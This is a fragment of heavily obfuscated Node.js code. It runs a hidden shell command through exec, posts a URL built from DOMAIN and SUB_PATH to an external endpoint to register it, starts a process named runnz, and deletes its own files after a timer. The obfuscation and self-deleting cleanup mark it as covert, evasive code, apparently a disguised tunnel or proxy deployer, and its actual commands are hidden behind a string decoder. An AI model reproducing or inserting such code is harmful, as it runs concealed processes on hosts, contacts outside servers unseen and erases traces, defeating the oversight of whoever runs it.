return;}try{exec(_0x407fcd,{'shell':_0x3ad663(0x186)},_0x41ae4b=>{const _0x275ac3=_0x3ad663;if(_0x41ae4b)console[_0x275ac3(_0x60bd69._0x5e477b)](_0x275ac3(_0x60bd69._0xc01ab7),_0x41ae4b);else console['log'](_0x275ac3(0x1c4));});}catch(_0x1a2df5){console[_0x3ad663(_0x159e9e._0x7d890)]('error:\x20'+_0x1a2df5);}};async function addAccessTask(){const _0x10402a={_0x5de7d0:0x174,_0x360b24:0x14c},_0x1197da=_0x28c5ac;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x578b61='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x1cf0e7=await axios[_0x1197da(0x16c)](_0x1197da(_0x10402a._0x5de7d0),{'url':_0x578b61},{'headers':{'Content-Type':_0x1197da(0x168)}});console[_0x1197da(_0x10402a._0x360b24)](_0x1197da(0x1b6));}catch(_0x596ca5){}}const delFiles=()=>{const _0x5e9ebb={_0x14d752:0x16e},_0x2e09be=_0x28c5ac;[_0x2e09be(0x18d),_0x2e09be(0x170)][_0x2e09be(_0x5e9ebb._0x14d752)](_0x9d7b7d=>fs['unlink'](_0x9d7b7d,()=>{}));};function _0x4934(_0x56f679,_0x2fc30a){const _0x674eda=_0x674e();return _0x4934=function(_0x49345d,_0x38aa72){_0x49345d=_0x49345d-0x137;let _0xaae82=_0x674eda[_0x49345d];return _0xaae82;},_0x4934(_0x56f679,_0x2fc30a);}httpServer[_0x28c5ac(0x1ae)](PORT,()=>{const _0x4c63f9={_0x14bb5f:0x176},_0x35fbcd=_0x28c5ac;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x35fbcd(_0x4c63f9._0x14bb5f)+PORT);});
